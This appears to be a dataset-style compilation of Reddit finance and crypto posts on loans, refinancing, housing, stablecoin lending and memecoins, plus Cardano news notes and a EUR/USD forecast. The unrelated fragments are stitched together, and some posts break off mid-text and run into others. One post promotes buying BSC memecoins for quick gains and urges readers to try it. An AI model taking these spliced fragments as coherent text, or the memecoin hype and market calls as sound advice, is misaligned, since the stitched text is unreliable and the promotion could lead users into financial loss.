47. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
48. The Plutus Pioneer program has been open sourced!

Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way.

89. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.

Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.

## Key event: USD. Interest Rate

**Interest rate at which major financial institutions borrow and lend overnight funds between themselves;**

**We expect a similar reading to the previous month: 0.25%**

**Until release day (Wednesday), we expect a continuation of the actual trend. A positive or negative surprising data value could affect the actual trend direction.**

## Key Levels:

* **Resistance 1.2150, 1.2300**
* **Support 1.1990, 1.1850, 1.1700**

## Trend EUR/USD

**Bullish**

**Price has recovered aggressively to the upside. A test of the next resistance is very likely. If that level doesn't hold we should see a rally all the way to 1.2250 / 1.2300.**

## Call to Action/Trade Idea

**We will look for any opportunity to join the bullish trend. Any retracement or pullback to support levels. Only an unexpected important release might overturn the actual trend.**

CryptoCurrency,Distrust of the federal banking system,"I just saw a tweet that said “Retweet if you trust Bitcoin more than your bank”. 

If I’m not mistaken, wasn’t the Great Depression of 1929 blamed on the stock market crash and nationwide banking panics?

If Americans begin taking their money from the bank and investing it into crypto, isn’t this the same thing? I mean, I’m all for decentralized peer to peer trading, it’s an amazing, inventive thing; however if we all keep pulling money from banks, what will happen to the American economy? Will crypto become that catalyst which led to the downfall of the United States? 

We should rather view crypto as an alternative to fiat currency opposed to a competitor. I have been told that it is unwise from an investment standpoint to assume that crypto is going to replace money (in the near future), as it is uncertain what could happen. Would it be possible for this boom in crypto to play a role in another American depression? What will the price of money be if everyone in the world (I know, sounds unrealistic) decided to exchange their money or get paid in crypto?

Like I said, I’m a fan of crypto. I’m on your side. I’m just thinking about the possibilities that could potentially threaten the financial stability of a nation. Any insight/reassurance would be greatly appreciated.

Forex,How to be avoid entering bad trades.,"Go back to your trading journal and open up your winning trades. Note down what is similar in each setup. For example what kind of zone/breakout it formed. Or what kind of entry you entered on each trade. Now do the same with the losing trades, make sure you look deeply into it because it's sometimes hard to spot. For 2 trades to be identical, the same amount of traders need to participate in the market for the same outcome - trading in the zone (book). Now let's put this in a vast perspective, if you want the market to go up, it needs more buyers than sellers. Now let's say a news event is about to take place and now has a imbalance of buyers and sellers which changes the whole perspective. This will make your trade setup invalid. In a uptrend there are more buyers than sellers but a news event such as interest rate changes can shift the whole narrative, but if your arrogant enough not to look at other factors such as fundamentals then you will only blame yourself and the markets. 

Conclusion. If you enter every single trade setup, you will not be profitable because your mind will think every trade will be a winner. Even when your backtesting you are zooming through days within minutes. In real life markets them minutes feel like hours waiting for a setup to form. Be patient and learn from your experience!",finance

Bitcoin,Why Bitcoin is so hard for traditional economists and investors to understand.,"I have been working in finance for the last 15 years, with a background in applied economics and I didn’t have my Bitcoin epiphany until last year. When I first heard about Bitcoin, I dismissed it immediately with the same tired Dutch tulip bubble critique. As you are well aware, this is literally always the go to example used by detractors. 

On the surface, it’s not that hard to understand why this is their initial reaction. Think of all the barriers that one has to cross: what exactly is the technology behind it, what if it gets hacked, price volatility, government bans, use case, bad actors (Mt. Gox), environmental impact, and other various FUD. Then once you get past that - you have to learn about exchanges, wallets, private keys, self custody, mining process, halving, hard forks, hash rate, etc. Honestly, it takes an exhausting amount of learning to even come to an informed decision on Bitcoin. But in my experience, when someone takes the time to peel back all these layers, they almost always reach the Bitcoin singularity and then there is no going back. 

My Bitcoin journey was borne out a simple math problem of world wide governmental spending and how quickly that is going to catch up with us. When just looking at the US government’s baked CBO projections and adjusting for their historical inaccuracies, you see an inflationary situation unfolding of 10% or more year over year, starting in about 8 years. This calculation was done before all the covid spending, which is obviously going to accelerate that timeline. 

Bitcoin is so much more than an investment and it’s hard to categorize it as just one thing.

dogecoin,Bank Loan then Doge?,"Question:  Should I go to my bank and get like about 30,000 USD Loan and dump it into Dogecoin?

I have about 46k doge at 0.0827.  If I cash out now at 4-25 @ 10:05am id have profit 8493.30 with a net cost of 3,837.81 for a total pullout of 12,327.63.

With the 12k, I can pay off both credit cards and 1/2 my car loan.

So if I am about this Doge life, I am thinking that I should just get a chunk of money from a bank as a loan, and doge it. (And I am going to hold for at least 1 year)

This is what I have decided:

I am going to wait for the next spike, sell off enough doge to pay off my two CCs, then apply for a bank loan and see what the interest rate is, if it is low enough to be acceptable -- I will get the loan (just hold it in some random bank account) and then if I decided to do it, I can.

personalfinance,"Should I pay off my loans, invest, or both?","Hi all,

I am 28F and at a point in my financial life where I've been very risk-adverse, and know I need to make some changes with how I manage my saved up money so I'm seeking some objective advice. (I'm also planning on talking to a financial advisor soon, but wanted to reach out to the reddit world so I have some ideas before going into this meeting). Should I just pay off my loans now? Or invest my savings instead? Details below...

**Current situation:** The company I've been working for just got acquired and my last day of work is next week, which means I have 9 months of severance coming my way in two weeks. After that comes in, I'll have \~$100k in savings. I do not have a job lined up yet, so getting a job is priority #1. I am at various interview stages with several companies, and hope to have a job by June with a \~$100k  (+/- 10k) salary, which is what I was making at my previous position. Job hunting is going to be my full time focus...I've had a few people say I should take advantage of the upcoming opportunity to relax a bit, given I have a generous severance, but I just don't think I am chill enough to do that...

**Expenses:**

* Rent: $1900 / month
* Utilities: \~$200 / month (gas/electric/laundry/phone bill)
* Food/drinks: \~$500 / month
* Other misc expenses: \~$100 / month (if that...I've really just been lying low during the pandemic)

**Loans:**

* Private student loan: $10,500. Interest Rate: 8%. Monthly payment: $135. I have only been making the monthly payments. I know I should probably just pay this off but have felt trigger shy since I haven't signed an offer for a new job yet 
* Federal student loan: $37k. Interest Rate: 5.4%. No monthly payments until October since the loan is in pandemic forbearance. Like many people I'm sure, I've been waiting to see if Biden comes through with any loan forgiveness and haven't put any money towards this loan all year.

**Investments:** 

* 401k: $27,00. I had been contributing 8%, and my company didn't match since we were so small. I intend on rolling this over to a new 401k once I get a job and continuing to contribute in the 8-10% range (hopefully my next spot matches)
* Otherwise I have a measly acorns account with $225. I do have a fidelity investment account but nothing in it...again, have been trigger shy but also not knowledgeable at all either. Since I'm about to have more free time (in between interviews), I'm also planning on reading some Investment 101 books and the wiki on here as well (thanks to the mods for maintaining that). Any other tips are welcome.

**Long term goals:**

* I would love to own my own place eventually, but the area I'd like to live in is very high cost (I don't drive and so want to stay in an urban area). In the very casual zillow searches I've done, I'm looking at $500 - $800k ranges for homes near public transportation. I have not given this much thought otherwise, mostly because up until last year I didn't have anywhere near the amount of money I have now, so owning seemed like a pipe dream. 
* Ultimately, my more concrete long term goal for right now is to grow my money as fast and efficiently as possible, but at the same time, the idea of not having student loans is also alluring. Any perspective on my current situation is much appreciated!",finance
personalfinance,Save it or pay off debt?,"Hi everyone, 
I’m looking for some personal finance advice. I’d appreciate honest and non judgmental responses. Let me start off by saying after my husband and I bought a house in 2015 (a foreclosure), we didn’t do well with a budget and ended up in some credit card debt etc, resulting in us living paycheck to paycheck for a few years. This also includes student loan debt, car loan and medical debt. We are finally at a point where we refinanced, and will be saving about 500 per month which is amazing. Anyway, we also have money we received via stimulus and other sources and I’m so afraid of not spending it right. I want to find a balance of saving, paying off debt, paying our current finances and being able to enjoy life. I never want to live paycheck to paycheck again. 

With that said, we currently have this amount in our checking bank account: $5600 and $1130 in our savings. We pay a good 3000 per month on everything and make about 3000-3500 income monthly. 

I am assuming that we should be tackling the debt with the highest interest rate first ? Should I try to save at all or pay off as much as I can in debt and save very little? I feel like it’s important to have an emergency fund but I honestly don’t know what the best way to go about this. I know if we pay off debt, the spending will be less every month on the debt balances. Thank you.

So just an update. I wrote this when I wasn’t looking at my budget book. We actually make about 4000-4500 in take home pay. We pay almost 800 in debts per month. We have about 13000 in debt - 6000 of it is medical which has no interest ( I had a baby), 2000 is credit card, and the rest is student loans/car loan. I think paying them off in big chunks will help. Our mortgage will be around 1100 per month. I appreciate those who have been helpful and understanding. I understand I haven’t been smart about money and that’s why I thought I’d throw this post out there and keep learning how to manage it. I can post more info at some point later but I have two little ones that I need to go take care of. Thanks!",finance

personalfinance,New Build - Housing Market 2021 Pricing &amp; Affordability,"I think I speak for all redditors looking to buy a home in 2021 when I say this housing market is intense. I’d appreciate some additional perspective or help from those of you navigating the market. 

1. Income/Debt
My wife and I have combined incomes of $113k in a LCOL area. That will go up to $122k later this year. 

I bring home about $3650 every month with 10% Roth  401k contribution. My wife brings home about $1700 each month, all our benefits are paid for by her. She contributes about 6% to her 401k. We’re well positioned for retirement, she will have a pension. 

Savings: 
$25k 

We just became a dual income household last year when my wife graduated college. 

We’re in our mid-twenties. Our debts include:

Cars - $23k 
Student loans - $22k
Credit Card - $748 (Needed furniture and my wife needed her credit built, I co-signed) 

My wife has $26k in student debt, but it isn’t a factor since her employer is paying that debt off for her. 

We’d get approved on my income alone to get a better interest rate. That’s the plan at least. 


2. Local housing market 
No supply, much like everywhere else. We had the opportunity to buy a home for $240k, but we would have had to do about $20k in upgrades and didn’t feel the home was worth it at $240k. It sold within a week above asking. 

We’re considering building. Our LCOL area is quickly being discovered by retirees and other millennials. 

We have a few options to build from $270k to $295k. 

We’d put between 3-5% down. 

With rates at 3% and listed properties leaving the market quickly, is building a new home in this market stupid? 

I calculate our mortgage (P+I), homeowners insurance, taxes, and PMI or MIP depending on the loan product to be around $1500-$1700. 

We have an amortization schedule in Excel. 

2021 Housing Market 
My thoughts are simple. The United States have criminally under built homes. People aren’t necessarily tapping their home’s equity to move into a more expensive home because of all the unknowns right now. The economy is on the verge of reopening. Housing could be a nice hedge against inflation risk. Rates will likely stabilize in the 3.5-3.7% range over the next 12 months. I see ramps here, not shocks. This isn’t 2008 for a myriad of reasons, but that’s another discussion. I respect the uncertainties of the market, but prices wouldn’t suddenly go down over the next 1-2 years, possibly even 3-5. The supply issues will likely persist. We need be building a lot more homes than we are right now for me to bet against housing over the next 10 years. 


Full disclosure, I am open to being wrong about absolutely everything. I am simply of the opinion that now isn’t necessarily as bad a time or buy. That’s completely geographic and situational.",finance
CryptoCurrency,Handling risk-management with your interest-bearing/lending accounts (Asking for a fellow r/CryptoCurrency member).,"u/norflark send me a dm after reading one of my posts. He asked me if I could post something on his behalf, as he usually only lurks subreddits, and doesn\`t have the needed comment karma to post. As his account age is almost 10 years old! (a real Reddit veteran), I couldn\`t say no to his request, because we are a community after all.

He is asking some pretty interesting questions. If anyone can help him, please reply to this post so he can engage in a discussion with you. Thanks in advance.

**So here is his story and his corresponding questions:**

''I'm considering putting some of my money to work in the world of defi and have been doing research, but I wanted to source some opinions here so I have some more ideas and jumping off points for further investigation. As the title implies, I'm curious how others manage risk specifically within the context of crypto interest-bearing/lending accounts.

The first thing that sticks out to me (and a lot of people new to this stuff) is how volatile the prices can be when you're comparing a specific coin to USD. It doesn't matter if I can get some high percentage of interest on some trash coin that's inevitably headed toward 0. Even for coins that are more mainstream, the interest/rewards are effectively nullified if the price drops. If you're bullish on a specific coin, I can obviously see how this would compound your gains, but I'm simply noting the high amount of risk associated with the current volatility. I imagine this will subside over time, but for now it remains a reality.

With this in mind, I started looking into Stablecoins. With these, I can trust that the price will remain around 1 USD barring any fundamental change, hack, or issue. I can use platforms like Celsius, BlockFI, or Nexo (and many others) to hold a stablecoin balance and generate interest with no additional effort required from my side. I lose the potential for the coin to moon, but with interest rates at 10%+ for many stablecoins at these places, that's not a huge concern of mine and I'd rather eliminate an entire risk factor if I'm already collecting gains that large.

At this point I have to acknowledge that these platforms can only offer interest rates like that because they are lending your coins out to others, and that this would essentially be a high-risk, high-reward savings account since none of it is FDIC insured. In some sort of crypto black swan event, it's likely that many of these loans default, the collateral tanks, and the platforms are unable to pay back those who were offering their assets as a supply. I believe we can do a few things to mitigate our risk against these events, but each comes with tradeoffs, mostly boiling down to yield limitations and security.

* Likely the most important - We can research and decide which platform(s) (in our opinion) have the safest risk-policy for lending and security.
   * Scams are bad, but even legitimate platforms do sometimes take on increased levels of risk to offer higher yields. The risk of loans falling through is passed down to you
* We can diversify which platforms we hold our money in.
   * As a quick example - If I have half my money at BlockFI and half at Celsius and BlockFI blows up, there's a chance that Celsius doesn't. Since we kept half of our money at each, we didn't lose it all.
   * An interesting question with this one is how much do you diversify? Each additional platform you hold funds in directly goes against our first point since the 3rd platform you add would theoretically be the one you feel the 3rd most confident in security/risk-wise.
* We can also diversify which stablecoins we are using.
   * Regardless of the platform(s) I'm using, if I have half my money in DAI collecting interest and half in USDC collecting interest, if DAI has some major bug/exploit come out, only half of my money is exposed to the issue.
   * A similar question can be posed here about how much you would want to diversify in this respect since each additional coin you add means you're lowering your effective yield (assuming you'd start with the stablecoin that offered the highest yield within your platform(s) of choice, then second highest, and so on and so forth).''

''Is there any major risk-mitigation that I can do that I'm missing?''

''Does anybody here employ the above strategies and to what extent?''

personalfinance,Back Pay Issue &gt;$4k,"Hi All,

My wife is a nurse who works at a hospital. They have been short staffed lately and have begun offering an incentive program for nurses to work extra shifts over the past six months. The hospital's incentive eligibility form states you must work an extra 48 hours over your FTE (full time equivalent) in a 4 week scheduling period.

Example: If your FTE is 36 hours per week you must work 192 (36\*4 +48) hours in 4 weeks instead of 144 (36\*4) hours in four weeks to get the incentive. The incentive here is $800 if you clear the hurdle by 48 hours over four weeks.

You can also qualify for a double incentive if you work 96 (36\*4 + 96) hours over your FTE in a four week scheduling period. The incentive here is $1,600 if you clear the hurdle by 96 hours over four weeks.

My wife is PRN, meaning **she has a FTE of only 24 hours per four week scheduling period**. This is the minimum requirement to meet her contract and keep her position. She works a minimum of 36-48 hours per week far exceeding this hurdle. Over the past five ""rounds"" of four week periods, she has cleared her FTE hurdle 96+ hours each time. She has been receiving the single incentive payment of $800 but not the double incentive of $1,600.

For the past several ""rounds"" of this incentive, her department manager has been telling her she actually needs to work 24 hours **per week** before her third 12 hour shift begins to count for the incentive. This is directly contrary to the written policy of the hospital. She has been paid on the schedule as outlined by her manager.

She has recently discovered that in other areas of the hospital nurses are reaching the double incentive after only meeting the 24 hour **per month** FTE requirement.

According to her calculations, she has been shorted approximately $4,000 ($800 \* 5) in wages due to her pay structure as outlined by her manager versus what is outlined in the hospital's policy.

Her manager is adversarial on this issue as the hospital incentivizes middle management to cut costs as much as possible. The way we see it there are a few courses of action.

1. go to executive management at the hospital and ask for the back pay
2. go to HR.
3. file a complaint with a government agency. E.g. Department of Labor
4. Sue the hospital in small claims court.
5. Seek legal advice.

To start...I know:

- speed of transaction
- ease of transaction
- network security
- network efficiency (uptime vs downtime)
- ecological impact
- use variations (NFTs, $ transfer, smart contracts, etc.)
- network effects (adoption and use)
- network effects - complementors  (development)
- ""tokenomics"" e.g. inflation/deflation and mechanisms for monetary policy 
- governance
- decentralization vs centralization
- team/foundation (ty u/mcbeaster)
- partnerships (ty u/mcbeaster)
- strategic plan/roadmap and batting avg (ty u/mcbeaster)

dogecoin,Marijuana Dispensaries Adapting DOGE Payment System - Solve Federal Banking Roadblocks,"There has been a lot of debate in recent months over the  stability of cryptocurrency, however many people in the cannabis  industry believe it could offer a solution to current financial  barriers. Many marijuana dispensaries have already started accepting several cryptocurrencies as a viable payment option for customers, **including most recently the acceptance of DOGE.** 

### Banking Solution 

Currently, marijuana is classified as a schedule I drug by the federal  government, and this is the sole reason federally insured banks will not  serve cannabis related businesses. Fortunately, crytpos provide a  completely legal way for cannabis retailers to process peer-to-peer  payments. 

Dealing  only in cash is a logistical nightmare and incredibly high risk for  armed robbery. Cryptocurrency presents a safe alternative for cannabis  retailers and unlike FDIC banks or online services like Paypal, crytpo offers an entirely legal financial solution. 

Marijuana dispensaries can create a  cryptocurrency wallet that can accept cryptocurrency from it's customers, then sell that crypto to convert to fiat currency which can then be legally deposited into federally insured banks or it can HODL that crypto and convert additional cash funds into crypto as an alternative to the traditional banking systems. 

If you own a dispensary accepting DOGE at your business is easier than you might think. A couple of startup companies  offer an intermediary payment solution by allowing clientele to use  their credit or debit cards.  A customer can simply purchase the  specified amount of crypto at a kiosk that can then be sent to the  designated dispensary's digital wallet. 

**This type of payment  method is fully compliant with state and federal laws and requires valid  ID from the purchaser.** 

### eCommerce 

Another area of the cannabis industry that can benefit from  cryptocurrency is ecommerce. Platforms such as Indospace.io allow  marijuana dispensaries to post online menus and accept crypto payments  from qualified patients. All orders are subject to a processing fee  but the balance is instantly applied to the retailers crypto wallet. 

Many business are still skeptical of cryptocurrency and are holding out  hope that traditional financial institutions will be more accepting  once marijuana is reclassified by the federal government. The movement is forging ahead despite these reservations to build a sustainable system that is untouched by bureaucracy.",cryptocurrency

personalfinance,Should we refinance our home?,"My husband and I are in our late 30s with no kids. He works in IT. I'm disabled and work part-time as an accounting assistant. Our annual net income is about $55k. We have good credit - my husband's FICO score is 783, and mine is 762. We're currently saving $800 each month and have $7k in our savings account. I plan on having that up to $15k by the end of the year - we're just starting to get some traction financially in the last year or so. We don't carry any credit card balances or car loans; other than the mortgage, our only debt is my student loans. They're massive - about $110k. The payment plan for them is based on my income alone, and my monthly payment is only $10 because I don't make very much. They're federal student loans in my name only, so they don't impact my husband.

We bought our home in 2015 for $175k. We had just received life insurance funds from my dad's passing, so we put $40k down. We got a 30-year VA mortgage at 3.25% and currently have $115k and 24 years left on it. Our payment with insurance and taxes is about $900. We don't pay any PMI because it's a VA loan. Real estate is on fire where we live, and the Zillow estimate for our home is up to $260k. That's pretty much in line with what comparable houses are selling for in the area.

Since interest rates are so low, I've been wondering if we should refinance. If we could drop our rate enough, we could refi to a 15-year loan and probably not see much change in our payment. We plan on staying in the home for life, and would love to get it paid off sooner rather than later.

I've gotten rates for a VA IRRRL (interest rate reduction refinance) loan from our current mortgage servicer and our local bank. The VA loans have very competitive rates and low closing costs, as far as I understand. The best quote I got was 2.75% for a 20-year loan. They said they couldn't do a 15-year - apparently the VA IRRRL program only allows for the payment to increase by a certain amount, and the shorter term would have exceeded the limit. Closing costs would be $1,070. The other quote we got was 3.375% for a 15-year refi (not sure why that's okay when the other company couldn't do a 15-year at a lower rate) which is obviously out.

I was thinking the rates would be lower. A quick search for IRRRL rates shows we should be able to get something around 2.5% for a 15-year loan for people with our credit and location.

Should I keep shopping for a better rate? If so, are there any companies to seek out or avoid? Should we look at conventional loans instead of VA? If we do, is it worth considering paying points for a lower rate? All the options make my head swim. We don't want a cash out refi, or to lower our payment; we'd just like to save a little money on interest and use that to pay off our home sooner. I don't know if it's worth refinancing for 0.75%, or just paying extra on principal.

Thanks, kind internet strangers.",finance

You know the drill, this is not financial advice, these are just my personal experiences. I wanted to share this as I've seen a lot of people ridiculing memecoins and BSC projects on here lately and I was the same not too long ago.

&amp;#x200B;

**A quick introduction**

I have been in crypto since 2017. A friend and coworker was constantly talking about it but I had little experience except mining some bitcoin in 2011 (réally wish I didn't stop after a week). I bought some Iota, some Vechain and some other altcoins. The bear market came and I stopped investing and kind of ignored my portfolio while other things in life demanded my attention until early 2020 when I had some money leftover and invested more in crypto. Got some bitcoin, some ADA and stupidly traded my VET. Anyway, the point of all this: I never had much to invest but build around a $2000 portfolio of BTC and alts. Through the fluctuations this year my portfolio has been hovering between $8000 and $10.000 roughly. A nice 5x return, but it took several years.

&amp;#x200B;

**The rise of the meme/shitcoin**

Of course there's always been Doge, but in recent months we've seen the meteoric rise of the BSC memecoin in many different forms. Safemoon, Safestar, Safedog, Safecat, ElonSafe, Safelon. The list is literally endless as they're created faster than I can write them down. I laughed it off at first like many probably did. I had a steady portfolio that I trusted would someday become my retirement fund. Why would I gamble on some pump&amp;dump memecoin that would probably rugpull? 

&amp;#x200B;

**One shot, one opportunity**

Until one day I was feeling lucky and decided to just take a gamble. I researched some projects all night long and picked three different ones. One was Safemoon, one was Fox Finance and the other was Safestar. I will go into the reasoning for these three later. I really was hyped at this point and wanted to invest immediately, but decided to go to bed first. Sleep on it. Next day I still wanted to do it, so I checked the finances, bought the BNB and setup a Trust wallet for my BSC adventures only. I put around $50 into all three projects.

&amp;#x200B;

I picked Safemoon because it was gaining lots of traction. These coins really run on hype mostly and Safemoon had lots of it. I was kind of late to the party so I knew there were less returns to be had, but the chance of it being rugpulled were lower than with an unestablished coin. I picked Fox because it looked very legit. A nice website, a friendly telegram server, a legit charity aspect and a 'good' roadmap (you can't compare these tokens to a proper coin's paper of course, they're literally hopes and dreams that might very well never come to fruition). Safestar was my YOLO bet. Either I was gonna get scammed or I'd be in early on the next moonshot. Now my three bets were spread across three quite different projects.

&amp;#x200B;

https://i.redd.it/8xy6k8jv2fv61.gif

**""Nonononono, that's a scam!""**

I stared at my money constantly and nothing much happened. It went up and down but I didn't see nowhere near the 100x returns that all the post titles on r/cryptomoonshots were promising me! I got bored, as millenials do when they don't become millionaires within a week after investing, and kind of wrote this stuff off as a scam and just went back to hodling my legit coins. I didn't really touch my Trust wallet for a few weeks and opened it back up around a month after I bought into these projects. My jaw dropped to the floor when I checked the value of my 'investment'. My $150 had turned into over 10BNB worth around $7000 (better days). My entire crypto 'career' of four years I managed to scrape together $8k and now suddenly I had made $7k in a month. I just smiled and grinned that entire day. I wasn't scammed. I wasn't rugpulled. Fox gave me amazing returns of between 50 and 100x at ATH, Safemoon got a little less and Safestar never gave me even 2x. Still, the overall return was mindblowing and none of the coins lost me even a dollar. 

&amp;#x200B;

**Make your exit plan**

I didn't have an exit plan at all when I got into this. I never expected these kind of returns. So I made one up as I went, slowly cashing out around 10% at certain milestones. When my Fox hit 5BNB, I took out 0.5. I made that back within an hour. That same night it hit 8 and I took another 0.8 out. Just days later I had $1000+ in my Binance account. I've never had more than $100 at a time in there. I felt like a kid in a candystore, picking out coins for my long term portfolio, doubling my ADA position with what felt like free money. I had more than made my initial investment back and like the gambling addict I had become, I decided to look for more memecoins to put part of my newly made profits into. I also sent my crypto-newbie girlfriend $50 in BNB to play around with as a simple introduction to crypto. Normally I'd suggest Doge for that, but uh... not at 40 cents a coin. We picked out some projects together. She picked Bonfire and Bingus. One because it looked decent and was picking up lots of hype and one because it was a cat. Sound logic for sure! You really have to put your logic aside with these memecoins. There are basically no fundamentals, you're just picking the ones that you think are going to pick up the most steam. Just three days later her $50 turned into nearly $700 proving once again that these memecoins really are capable of doing insanely fast returns.

&amp;#x200B;

https://i.redd.it/ob4dsy913fv61.gif

**The time I got rugged**

I got into a few more coins myself. Joined my girlfriend in Bonfire and Bingus and picked another one called Happy. These all turned out to be good projects with so far returns of between 0.8x (Bonfire) and 6x (Happy) within less than a week. I said I was done until a new one popped up on Cryptomoonshots: Capybara. Capybaras are my favorite animal and even though everything looked sketchy as hell, I decided to put a few leftover bucks in just for fun. The dev was really unprofessional in the telegram and within a few hours of it launching, the dev was gone from the channel and all the reddit posts were removed. He got out with just a few BNB and tainted the name of the lovely, peaceful Capybara for a few thousand bucks. The only good thing was the Telegram channel after the rugpull. Getting scammed together kind of bonds people. Still wouldn't recommend this as your #1 way to make friends as it can get costly.

&amp;#x200B;

**How to avoid scams and find gems**

You never know for sure what BSC projects are gonna pull the rug, but you can at least check for some vital signs of scammery. A token launching without a website is usually the sign of a really lazy scammer. A presale can be another red flag. For already launched tokens, always check the wallet distribution as with any coin or token you're getting into. Check if the liquidity is locked and for how long. Preferably check the devs if possible. Some of these tokens have been audited and have Doxxed devs which really helps build trust. Pick unique projects with something that differentiates them from others. Don't get SafeMusk, DogeMoon or MoonLambo. A simple to remember name that stands out, a logo that looks professional and a site that looks like it wasn't made in 5 minutes really help. A lot of new coins have a charity element and have actually donated thousands of dollars already. This is not only great for obvious reasons, but it also really helps with the marketing and improves the chances of it mooning.

&amp;#x200B;

You will always have to play the game of risk/reward here. Hopping onto a brand new coin within an hour of launch can be véry profitable but the risk is way higher. Waiting a bit for an audit, a community, a dev doxx, a few AMAs or even an exchange listing makes the chance of getting rugged way lower but you probably will miss that 100x chance by waiting. This is something that everyone should decide for themselves. 

&amp;#x200B;

**Sir, this is a casino**

As with any investment ánd any gamble, you should never invest what you're not willing to lose. You're absolutely insane if you put your life savings into a BSC memecoin. You could come out a millionaire but the chances are way bigger that you'll end up homeless. These coins aren't like your normal investment where you spend days learning about the usecase, the fundamentals, the code, the devs. They're a casino where you manage your risk versus reward. Do you bet on red by buying into an 'established' memecoin? Or do you put it all on 27 and hope for that big risky payday? Just like in a casino, be prepared to go home broke. This doesn't mean the casino is a scam. People willingly go in and gamble, just like on BSC. And just because you lost some money on BSC does not mean the entirety of it is a scam and should be avoided. I am nowhere near done and have already made more profits on BSC than in four years of legit crypto investing.

&amp;#x200B;

**A few groundrules:**

1. As usual, only invest what you're willing to lose. I suggest not using more than $50 on your first bet but of course adjust to your own financial situation.

2. How risk-averse are you? This probably isn't for you if you only invested in safe coins like BTC so far.

3. You háve to get used to the red candles. You're gonna see a lot of them and they're gonna be big. If you panic sell at each sign of red, you're gonna be broke real soon. In return, green candles will probably be plentiful too.

4. This is a side hustle. Memecoins should, obviously, not be your main investment strategy. Buy your proper coins for the week/month and put a few tenners into BSC. It's kind of like buying a lottery ticket with your leftover grocery money. Except you might make actual money. Don't take out your life savings or sell your ETH for this. This is way too risky and besides, doing so makes it way too emotional. Seen many people in the telegrams do this and they usually panic sell for a loss because it's basically impossible to mentally deal with the volatility of these memecoins if your life savings are riding on it. 

5. Give it a month. The telegram channels for these coins are full of people panicking or calling everything a scam because they can't buy a lambo for their $10 investment after three days. These are highly volatile but even a memecoin takes a few weeks to truly get going. 

6. Don't stare at the price all day, especially with new coins. Less holders means more volatility and you will see entire BNB's evaporate in seconds when big whales dump early on. I suggest not looking at your value especially if you're prone to panic selling. Usually this settles down a bit and turns into more natural movement as more people get in. Example: I bought 2BNB of Happy an hour after it launched. Woke up the next day with 11BNB. An hour later it was 3.5. Now, a few days later, it's back over 10 and now the price movement is way more natural. Learn to love the volatility and learn to trust in the project, even if it is a sketchy memecoin. You still picked it for a reason, hopefully. Constantly switching to the next one will probably not make you more money than the good old mantra of HODL.

7. Decide your exit strategy up front. Are you gonna cash out everything once you hit 10x? Or cash out 10% at certain levels? I suggest always at least letting a little bit ride as you don't wanna be the guy who sold his Safemoon for a few bucks profit and missed the 1000x rocket. Take your initial investment plus some profit out early if you get emotional. This makes hodling a lot easier as you already profited and are now playing with house money. Also make sure you're realistic. Don't expect a random memecoin to get to $0.01 and overtake BTC in market cap. Trust me, I've seen plenty of people get way too hyped and claim stupid shit like this.

8. Learn to use Trust wallet. New memecoins will not display value. This doesn't mean you got scammed. Always check your value on Pancakeswap. It's the only real price that you can actually sell for. Charts and wallet values are usually wrong or behind. Also be weary that almost all of these charge a fee of up to 12% for liquidity and to give back to holders, so cashing out after you've gained 10% will actually cost you money.

9. Have fun! Join the telegrams/discords. They're usually a fun place to hang around. There's lots of crypto newbies asking the same questions a 1000 times a day, along with people panicking over each drop. Millions of memes. But the overall atmosphere is usually great and positive even through all the chaos. Active devs are a great sign.

10. If it's not for you, don't go around declaring it a scam all over r/crytocurrency. Price volatility doesn't mean scam. Yes these memecoins are stupid and there's lots of scams among them, we all know that. But just ignore them and continue on investing in legit projects. There's plenty of crypto scams in the 'real' crypto community as well. Let people enjoy things and don't go around FUD'ing something you have no experience with. I will be enjoying this crazy ride until it inevitably ends and I'll look back on it with a smile and a big fat portfolio full of legit coins. 

&amp;#x200B;

Anyway, that was my presentation. I guess this sub will forever mock these and it's pretty hard not to. 98% has a stupid name, no usecase and will probably die an early death but if you use a bit of brain and have a bit of luck picking the right ones, returns on these can be absolutely massive regardless and it's a great way to expand your legit portfolio with just a few bucks.

&amp;#x200B;

*TLDR:* Memecoins are great if you treat them as what they are: a gamble instead of a legitimate crypto investment. Consider putting $10 in sometime!",cryptocurrency
financialindependence,The principles work.,"I frequent reddit as a lurker more than a poster. I had forgotten about a post I made in regard to my financial situation upon graduating from PA school 7 years ago. [https://www.reddit.com/r/financialindependence/comments/227cwa/please\_critique\_my\_plan\_for\_after\_graduation/](https://www.reddit.com/r/financialindependence/comments/227cwa/please_critique_my_plan_for_after_graduation/)

Reading it was weird, as I actually put in to play the things I said I wanted to do and I have completely changed my approach to money, versus how I was prior to graduation. Long story short, I was graduating with roughly $150k in student loan debt and if I remember correctly close to $20k on a used luxury car.

The short version is... I have successfully brought my personal net worth from -$170k to now $500k in 7 years, roughly a $670k net gain. My income began at near $100k and never exceeded $135k. I live in a medium COL area. I used basic principles and no fancy investing.

\-I was able to secure three jobs out of school and for the first two years sometimes worked every single day of the month, without a day off. I did this to purchase my first home (a small townhouse) and catch myself up on bills and savings.

\-I sold the luxury car and bought a base model Honda Accord.

\-I maxed my retirement accounts. I only recently began an after tax account.

